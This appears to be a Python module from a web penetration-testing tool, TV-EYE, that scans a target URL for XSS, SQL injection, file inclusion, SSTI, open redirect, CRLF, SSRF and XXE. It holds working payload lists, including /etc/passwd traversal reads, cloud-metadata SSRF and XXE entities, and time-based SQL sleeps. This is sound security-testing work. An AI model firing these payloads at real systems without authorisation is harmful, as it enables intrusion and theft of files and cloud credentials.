"""Injection scanners for TV-EYE: XSS, SQLi, LFI, SSTI, redirect, CRLF, SSRF, XXE.

Findings are deduplicated per parameter: one consolidated finding with all
confirming payloads listed in the evidence.
"""

import re
import time
import urllib.parse

from ..core import BaseModule, ModuleError
from .. import util as U
from .. import colors as C


def _inject_param(raw, param, value):
    """Return raw URL with `param` set to `value` (adds it if missing)."""
    parts = urllib.parse.urlsplit(raw)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    qs = [(k, v) if k != param else (k, value) for k, v in qs]
    if not any(k == param for k, _v in qs):
        qs.append((param, value))
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path,
                                    urllib.parse.urlencode(qs), ""))


class _InjectBase(BaseModule):
    def _target(self):
        t = self.ctx.get_option("target") or (self.ctx.targets[0] if self.ctx.targets else None)
        if not t:
            raise ModuleError("set 'target' option (full URL with params, or use param_miner)")
        return t

    def _params(self, url):
        return U.parse_url_params(url)

    def _crawl_params(self, base):
        """Discover injectable params from links on the homepage."""
        r = U.http_request(base, timeout=self.ctx.timeout,
                           user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                           verify=self.ctx.verify_tls)
        if not r.ok:
            return []
        pset = set()
        for u in U.extract_links(r.body):
            for k, _v in U.parse_url_params(u):
                pset.add(k)
        return sorted(pset)[:12]


class XssScannerModule(_InjectBase):
    NAME = "xss_scan"
    DESCRIPTION = ("Reflected XSS scanner: probes params with context-aware "
                   "canary payloads and checks raw reflection")
    CATEGORY = "inject"
    REQUIRED = ["target"]

    PAYLOADS = [
        ('"\'><tveyealert>alert(1)</tveyealert>', "<tveyealert>"),
        ('"><svg/onload=alert(1)>', "<svg/onload"),
        ("javascript:/*--></title></style></textarea></script></xmp>"
         "<svg/onload='+/\"/+/onmouseover=alert(1)/>//", "</script"),
        ('<img src=x onerror=alert(1)>', "<img src=x onerror"),
        ('{{7*7}}${7*7}<%= 7*7 %>', "<%= 49 %>"),
        ('"><a href="javascript:alert(1)">x</a>', 'href="javascript:'),
        ("'\"><details open ontoggle=alert(1)>", "<details open ontoggle"),
    ]

    def options(self):
        return {"target": "URL with params (e.g. https://site/search?q=1)",
                "param": "specific parameter to test (optional, default: all)",
                "crawl": "1 to auto-discover params from homepage"}

    def run(self):
        raw = self._target()
        _s, _h, _p, base = U.normalize_target(raw)
        cand_params = []
        if self.ctx.get_option("param"):
            cand_params = [self.ctx.get_option("param")]
        else:
            cand_params = [k for k, _v in self._params(raw)]
            if not cand_params and str(self.ctx.get_option("crawl", "0")) == "1":
                cand_params = self._crawl_params(base)
        if not cand_params:
            cand_params = ["q", "search", "s", "id", "name", "page"]
            self.info("no params in URL; testing common params %s" % cand_params)
        self.info("testing %d parameter(s) x %d payloads" % (
            len(cand_params), len(self.PAYLOADS)))
        tests = []
        for p in cand_params:
            for idx, (pl, sig) in enumerate(self.PAYLOADS):
                tests.append((p, pl, sig, idx))

        def job(t):
            p, pl, sig, idx = t
            url = _inject_param(raw, p, pl)
            r = U.http_request(url, timeout=self.ctx.timeout,
                               user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                               verify=self.ctx.verify_tls, retries=0)
            if r.ok and sig.lower() in r.body.lower():
                return (p, idx, r.status, len(r.body), url, sig)
            return None

        results = U.worker_pool(tests, job, threads=max(2, min(self.ctx.threads, 12)))
        by_param = {}
        for p, idx, status, ln, url, sig in [r for r in results if r]:
            by_param.setdefault(p, []).append((idx, status, ln, url, sig))
        findings = []
        for p, hits in by_param.items():
            _idx, status, ln, url, sig = hits[0]
            findings.append((p, len(hits), status))
            print("   %s param=%-14s %d payload(s) reflected, e.g. HTTP %s (%s)" % (
                C.c("REFLECT", C.BOLD), C.c(p, C.BRIGHT_GREEN), len(hits),
                status, sig[:40]))
            self.add_finding(
                "Possible reflected XSS in parameter '%s'" % p,
                "medium", url,
                "Canary payload(s) reflected raw into the response body.\n"
                "Parameter: %s\nReflected payload examples: %s\n"
                "Response: HTTP %s, %d bytes" % (
                    p, "; ".join(h[4] for h in hits[:6]), status, ln),
                tip="Manually verify with a browser and prove execution; "
                    "check encoding context (attribute/JS/HTML).",
                cwe="CWE-79")
        self.output({"url": raw, "reflects": findings})
        self.success("xss_scan: %d parameter(s) with raw reflection - verify "
                     "execution in browser" % len(findings))
        return "xss scan finished (%d params reflected)" % len(findings)


class SqliScannerModule(_InjectBase):
    NAME = "sqli_scan"
    DESCRIPTION = ("SQL injection scanner: error-based, boolean-based and time-based "
                   "probes with response comparison")
    CATEGORY = "inject"
    REQUIRED = ["target"]

    ERRORS = [
        ("MySQL", re.compile(r"you have an error in your sql syntax|warning: mysql|"
                             "unclosed quotation|mysqli?_?error", re.I)),
        ("PostgreSQL", re.compile(r"postgresql.*error|pg_query|syntax error at or near", re.I)),
        ("MSSQL", re.compile(r"unclosed quotation mark|odbc.*driver|sqlsrv|"
                             "microsoft ole db provider", re.I)),
        ("Oracle", re.compile(r"ora-\d{5}|quoted string not properly terminated", re.I)),
        ("SQLite", re.compile(r"sqlite3?\.|unrecognized token|near \".*\": syntax error", re.I)),
        ("Generic", re.compile(r"sql syntax|database error|db error", re.I)),
    ]

    def options(self):
        return {"target": "URL with a numeric/string parameter (e.g. /item?id=3)",
                "param": "specific parameter (optional)",
                "time_based": "1 to also run slow time-based probes (slower)"}

    def run(self):
        raw = self._target()
        cand = []
        if self.ctx.get_option("param"):
            cand = [self.ctx.get_option("param")]
        else:
            cand = [k for k, _v in self._params(raw)] or ["id", "user_id", "product", "cat"]
        self.info("SQLi probing params: %s" % cand)
        tests = []
        for p in cand:
            for pl in ("'", '"', "1 OR 1=1", "1' OR '1'='1", "1) OR 1=1--",
                       "1 UNION SELECT NULL--"):
                tests.append((p, pl))
        do_time = str(self.ctx.get_option("time_based", "0")) == "1"
        if do_time:
            tests.append((cand[0], "'; WAITFOR DELAY '0:0:6'--"))
            tests.append((cand[0], "1' AND SLEEP(6)--"))

        def job(t):
            p, pl = t
            url = _inject_param(raw, p, pl)
            started = time.time()
            r = U.http_request(url, timeout=self.ctx.timeout + 12,
                               user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                               verify=self.ctx.verify_tls, retries=0)
            dt = time.time() - started
            if not r.ok:
                return None
            db = None
            for dbn, rx in self.ERRORS:
                if rx.search(r.body):
                    db = dbn
                    break
            return (p, pl, r.status, len(r.body), dt, db, r.body[:300], url)

        results = U.worker_pool(tests, job, threads=max(2, min(self.ctx.threads, 10)))
        err_by_param, time_by_param = {}, {}
        for p, pl, status, ln, dt, db, snip, url in [r for r in results if r]:
            if db:
                err_by_param.setdefault((p, db), []).append((pl, status, snip, url))
            elif do_time and dt > 5.0 and ("DELAY" in pl or "SLEEP" in pl):
                time_by_param.setdefault(p, []).append((pl, dt, url))
        findings = []
        for (p, db), hits in err_by_param.items():
            pl, status, snip, url = hits[0]
            findings.append((p, "error:" + db, len(hits)))
            print("   %s param=%-12s %d payload(s) -> %s error!" % (
                C.c("ERROR-SQLI", C.BOLD), C.c(p, C.BRIGHT_RED), len(hits), db))
            self.add_finding(
                "SQL injection (error-based) in parameter '%s' (%s)" % (p, db),
                "high", url,
                "Database error triggered by %d payload(s).\nParam: %s\n"
                "Payloads: %s\nResponse snippet: %s" % (
                    len(hits), p, "; ".join(h[0][:24] for h in hits[:6]), snip[:250]),
                tip="Confirm with sqlmap; determine DBMS and enumerate safely.",
                cwe="CWE-89")
        for p, hits in time_by_param.items():
            pl, dt, url = hits[0]
            findings.append((p, "time", len(hits)))
            print("   %s param=%-12s response delayed %.1fs" % (
                C.c("TIME-SQLI", C.BOLD), C.c(p, C.BRIGHT_RED), dt))
            self.add_finding(
                "SQL injection (time-based) in parameter '%s'" % p,
                "high", url,
                "Response delayed %.1fs with payload: %s" % (dt, pl),
                tip="Verify with different delay values to rule out noise.",
                cwe="CWE-89")
        self.output({"url": raw, "findings": findings})
        self.success("sqli_scan: %d candidate(s)" % len(findings))
        return "sqli scan finished (%d candidates)" % len(findings)


class LfiScannerModule(_InjectBase):
    NAME = "lfi_scan"
    DESCRIPTION = ("Local/Remote file inclusion scanner: traversal payloads with "
                   "path normalization, wrapper probes and success signatures")
    CATEGORY = "inject"
    REQUIRED = ["target"]

    PAYLOADS = [
        ("../../../etc/passwd", "root:x:0:0:"),
        ("..%2f..%2f..%2fetc%2fpasswd", "root:x:0:0:"),
        ("....//....//....//etc/passwd", "root:x:0:0:"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:0:0:"),
        ("/etc/passwd", "root:x:0:0:"),
        ("../../../../../etc/hosts", "localhost"),
        ("php://filter/convert.base64-encode/resource=index.php", None),
        ("file:///etc/passwd", "root:x:0:0:"),
        ("../../../windows/win.ini", "[fonts]"),
        ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ]

    def options(self):
        return {"target": "URL with file-ish parameter (e.g. /view?page=about)",
                "param": "specific parameter (optional)"}

    def run(self):
        raw = self._target()
        cand = [self.ctx.get_option("param")] if self.ctx.get_option("param") else \
            [k for k, _v in self._params(raw)] or ["page", "file", "path", "include", "view"]
        tests = [(p, pl, sig) for p in cand for pl, sig in self.PAYLOADS]

        def job(t):
            p, pl, sig = t
            url = _inject_param(raw, p, pl)
            r = U.http_request(url, timeout=self.ctx.timeout,
                               user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                               verify=self.ctx.verify_tls, retries=0)
            if not r.ok:
                return None
            if sig and sig in r.body:
                return (p, pl, r.status, url)
            if "php://" in pl and re.match(r"^[A-Za-z0-9+/=\n]+$", r.body[:256].strip()) \
                    and len(r.body.strip()) > 20:
                return (p, pl, r.status, url)
            return None

        results = U.worker_pool(tests, job, threads=max(2, min(self.ctx.threads, 10)))
        by_param = {}
        for p, pl, status, url in [r for r in results if r]:
            by_param.setdefault(p, []).append((pl, status, url))
        findings = []
        for p, hits in by_param.items():
            pl, status, url = hits[0]
            findings.append((p, len(hits)))
            print("   %s param=%-12s %d payload(s) confirmed, e.g. %s (HTTP %s)" % (
                C.c("LFI-HIT", C.BOLD), C.c(p, C.BRIGHT_RED), len(hits), pl[:44], status))
            has_wrapper = any("://" in h[0] for h in hits)
            self.add_finding(
                "File inclusion/traversal in parameter '%s'" % p, "high", url,
                "Signature-bearing responses for %d payload(s).\n"
                "Payloads: %s\nHTTP status: %s" % (
                    len(hits), "; ".join(h[0][:40] for h in hits[:6]), status),
                tip="Verify manually; try reading known files; check RFI/filter chains.",
                cwe="CWE-98" if has_wrapper else "CWE-22")
        self.output({"url": raw, "hits": findings})
        self.success("lfi_scan: %d parameter(s) affected" % len(findings))
        return "lfi scan finished (%d params)" % len(findings)


class SstiScannerModule(_InjectBase):
    NAME = "ssti_scan"
    DESCRIPTION = "Server-side template injection scanner with engine math probes"
    CATEGORY = "inject"
    REQUIRED = ["target"]

    PROBES = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
        ("[[7*7]]", "49"),
    ]

    def options(self):
        return {"target": "URL with template-ish parameter (e.g. /page?name=)",
                "param": "specific parameter (optional)"}

    def run(self):
        raw = self._target()
        cand = [self.ctx.get_option("param")] if self.ctx.get_option("param") else \
            [k for k, _v in self._params(raw)] or ["name", "template", "msg", "view"]
        # baseline to avoid marking values that already contain 49/7777777
        baseline = ""
        r0 = U.http_request(raw, timeout=self.ctx.timeout,
                            user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                            verify=self.ctx.verify_tls)
        if r0.ok:
            baseline = r0.body
        tests = [(p, pl, exp) for p in cand for pl, exp in self.PROBES
                 if exp not in baseline]

        def job(t):
            p, pl, exp = t
            url = _inject_param(raw, p, pl)
            r = U.http_request(url, timeout=self.ctx.timeout,
                               user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                               verify=self.ctx.verify_tls, retries=0)
            if r.ok and exp in r.body:
                return (p, pl, exp, r.status, url)
            return None

        results = U.worker_pool(tests, job, threads=max(2, min(self.ctx.threads, 8)))
        seen = set()
        findings = []
        for p, pl, exp, status, url in [r for r in results if r]:
            if p in seen:
                continue
            seen.add(p)
            findings.append((p, pl, exp))
            print("   %s param=%-12s payload=%-40s evaluated to %s" % (
                C.c("SSTI", C.BOLD), C.c(p, C.BRIGHT_RED), pl[:38], exp))
            self.add_finding("Template injection (SSTI) in parameter '%s'" % p,
                             "high", url,
                             "Math probe '%s' evaluated to '%s' in the response "
                             "(HTTP %s). Baseline did not contain the result." % (
                                 pl, exp, status),
                             tip="Confirm engine type (Jinja2/Twig/Freemarker...) and "
                                 "escalate carefully with proof-of-impact.",
                             cwe="CWE-1336")
        self.output({"url": raw, "hits": findings})
        self.success("ssti_scan: %d candidate(s)" % len(findings))
        return "ssti scan finished (%d candidates)" % len(findings)


class OpenRedirectModule(_InjectBase):
    NAME = "open_redirect"
    DESCRIPTION = "Open redirect scanner across common params, 3xx + meta/JS fallbacks"
    CATEGORY = "inject"
    REQUIRED = ["target"]

    PAYLOADS = [
        "https://evil.example.com",
        "//evil.example.com",
        "https:evil.example.com",
        "/\\/evil.example.com",
        "https://evil.example.com%2f..",
        "///evil.example.com",
    ]

    def options(self):
        return {"target": "URL with redirect param (e.g. /login?next=)",
                "param": "specific parameter (optional)"}

    def run(self):
        raw = self._target()
        cand = [self.ctx.get_option("param")] if self.ctx.get_option("param") else \
            [k for k, _v in self._params(raw)] or ["next", "redirect", "url", "goto",
                                                   "return", "returnUrl", "continue",
                                                   "dest", "rurl", "callback", "link"]
        tests = [(p, pl) for p in cand for pl in self.PAYLOADS]

        def job(t):
            p, pl = t
            url = _inject_param(raw, p, pl)
            r = U.http_request(url, timeout=self.ctx.timeout,
                               user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                               verify=self.ctx.verify_tls, retries=0)
            if not r.ok:
                return None
            loc = r.header("location")
            if loc and "evil.example.com" in loc:
                return (p, pl, "30x", url, loc)
            if re.search(r"location(?:\.href)?\s*=\s*['\"]?https?://evil\.example\.com",
                         r.body, re.I):
                return (p, pl, "js", url, "js-redirect in body")
            if re.search(r"<meta[^>]+http-equiv=['\"]?refresh[^>]+"
                         r"url=https?://evil\.example\.com", r.body, re.I):
                return (p, pl, "meta", url, "meta refresh")
            return None

        results = U.worker_pool(tests, job, threads=max(2, min(self.ctx.threads, 10)))
        seen = set()
        findings = []
        for p, pl, kind, url, ev in [r for r in results if r]:
            if p in seen:
                continue
            seen.add(p)
            findings.append((p, pl, kind))
            print("   %s param=%-12s payload=%-30s type=%s" % (
                C.c("REDIRECT", C.BOLD), C.c(p, C.BRIGHT_YELLOW), pl[:28], kind))
            self.add_finding("Open redirect via parameter '%s'" % p, "medium", url,
                             "Redirect to attacker domain accepted.\nParam: %s\n"
                             "Payload: %s\nType: %s\nEvidence: %s" % (
                                 p, pl, kind, ev[:150]),
                             tip="Check server-side validation and allow-lists.",
                             cwe="CWE-601")
        self.output({"url": raw, "hits": findings})
        self.success("open_redirect: %d parameter(s) affected" % len(findings))
        return "open redirect finished (%d params)" % len(findings)


class CrlfScanModule(_InjectBase):
    NAME = "crlf_scan"
    DESCRIPTION = "CRLF injection / header injection / response splitting probe"
    CATEGORY = "inject"
    REQUIRED = ["target"]

    PAYLOADS = [
        "%0d%0atveye: 1",
        "%0atveye: 1",
        "%0d%0a%0d%0a<html>tveye</html>",
        "%0d%0aLocation: https://evil.example.com",
    ]

    def options(self):
        return {"target": "URL to test (any path)",
                "param": "optional parameter to inject into"}

    def run(self):
        raw = self._target()
        param = self.ctx.get_option("param")
        tests = [(param, pl) for pl in self.PAYLOADS]

        def job(t):
            p, pl = t
            if p:
                url = _inject_param(raw, p, pl)
            else:
                spl = urllib.parse.urlsplit(raw)
                url = urllib.parse.urlunsplit(
                    (spl.scheme, spl.netloc, spl.path.rstrip("/") + "/" + pl,
                     spl.query, ""))
            r = U.http_request(url, timeout=self.ctx.timeout,
                               user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                               verify=self.ctx.verify_tls, retries=0)
            if not r.ok:
                return None
            hdr_txt = " ".join("%s: %s" % (k, v) for k, v in r.headers.items())
            if re.search(r"tveye\s*:\s*1", hdr_txt, re.I):
                return (p, pl, "header-reflection", url, hdr_txt[:200])
            return None

        results = U.worker_pool(tests, job, threads=4)
        seen = set()
        findings = []
        for p, pl, kind, url, ev in [r for r in results if r]:
            key = p or "path"
            if key in seen:
                continue
            seen.add(key)
            findings.append((p, pl))
            self.add_finding("CRLF / header injection via %s" % (
                "param " + str(p) if p else "path"),
                "medium", url,
                "Injected header reflected: %s\nPayload: %s" % (ev, pl),
                tip="Sanitize CR/LF in any value echoed into response headers.",
                cwe="CWE-113")
            print("   %s %s -> %s" % (C.c("CRLF", C.BOLD), pl, ev[:60]))
        self.output({"url": raw, "hits": findings})
        self.success("crlf_scan: %d hit(s)" % len(findings))
        return "crlf scan finished (%d hits)" % len(findings)


class SsrfScanModule(_InjectBase):
    NAME = "ssrf_scan"
    DESCRIPTION = ("SSRF scanner using internal-address heuristics and an optional "
                   "out-of-band canary (webhook.site)")
    CATEGORY = "inject"
    REQUIRED = ["target"]

    def options(self):
        return {"target": "URL with url/fetch param (e.g. /fetch?url=)",
                "param": "specific parameter (optional)",
                "canary": "webhook.site token for OOB detection (optional)"}

    def run(self):
        raw = self._target()
        cand = [self.ctx.get_option("param")] if self.ctx.get_option("param") else \
            [k for k, _v in self._params(raw)] or ["url", "uri", "fetch", "src",
                                                   "load", "img", "host", "domain", "feed"]
        canary = self.ctx.get_option("canary", "")
        payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/metadata/instance",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "http://[::1]:80",
        ]
        if canary:
            payloads.insert(0, "https://webhook.site/" + canary)
        tests = [(p, pl) for p in cand for pl in payloads]

        def job(t):
            p, pl = t
            url = _inject_param(raw, p, pl)
            r = U.http_request(url, timeout=self.ctx.timeout + 5,
                               user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                               verify=self.ctx.verify_tls, retries=0)
            if not r.ok:
                return None
            hit = None
            if "ami-id" in r.body or "instance-id" in r.body:
                hit = "cloud metadata leaked"
            elif "root:x:0:0:" in r.body:
                hit = "file read success"
            elif pl.startswith("https://webhook.site") and r.status < 400:
                hit = "OOB canary sent (verify webhook.site for the callback)"
            elif r.status == 200 and pl.startswith("http://127.0.0.1") and len(r.body) > 50:
                hit = "internal service response"
            if hit:
                return (p, pl, hit, r.status, url, r.body[:200])
            return None

        results = U.worker_pool(tests, job, threads=max(2, min(self.ctx.threads, 8)))
        seen = set()
        findings = []
        for p, pl, hit, status, url, snip in [r for r in results if r]:
            if p in seen:
                continue
            seen.add(p)
            findings.append((p, pl, hit))
            sev = "high" if ("metadata" in hit or "file read" in hit) else "medium"
            self.add_finding("SSRF via parameter '%s' (%s)" % (p, hit), sev, url,
                             "Payload: %s\nResponse HTTP %s\nBody: %s" % (pl, status, snip),
                             tip="Prove impact: metadata creds, internal port scan, file read.",
                             cwe="CWE-918")
            print("   %s param=%-10s payload=%-46s -> %s" % (
                C.c("SSRF", C.BOLD), C.c(p, C.BRIGHT_RED), pl[:44], hit))
        self.output({"url": raw, "hits": findings})
        self.success("ssrf_scan: %d candidate(s)" % len(findings))
        return "ssrf scan finished (%d candidates)" % len(findings)


class XxeProbeModule(_InjectBase):
    NAME = "xxe_probe"
    DESCRIPTION = ("XXE probe: send DTD payloads to XML endpoints and check "
                   "file-read/error responses")
    CATEGORY = "inject"
    REQUIRED = ["target"]

    def options(self):
        return {"target": "URL accepting XML (POST)",
                "content_type": "content type (default application/xml)"}

    def run(self):
        raw = self._target()
        ctype = self.ctx.get_option("content_type", "application/xml")
        payloads = [
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
             '"file:///etc/passwd">]><r>&xxe;</r>', "root:x:0:0:"),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
             '"http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>', "ami-id"),
        ]
        findings = []
        for pl, sig in payloads:
            r = U.http_request(raw, method="POST", data=pl, timeout=self.ctx.timeout,
                               headers={"Content-Type": ctype},
                               user_agent=self.ctx.user_agent, cookie=self.ctx.cookie,
                               verify=self.ctx.verify_tls)
            if r.ok and sig in r.body:
                findings.append(pl)
                self.add_finding("XXE confirmed at %s" % raw, "high", raw,
                                 "Payload: %s\nResponse contained: %s\nHTTP %s" % (
                                     pl[:160], sig, r.status),
                                 tip="Demonstrate file read / SSRF; suggest disabling DTDs.",
                                 cwe="CWE-611")
                print("   %s HTTP %s -> %s" % (C.c("XXE-HIT", C.BOLD), r.status, sig))
        self.output({"url": raw, "hits": len(findings)})
        self.success("xxe_probe: %d hit(s)" % len(findings))
        return "xxe probe finished (%d hits)" % len(findings)
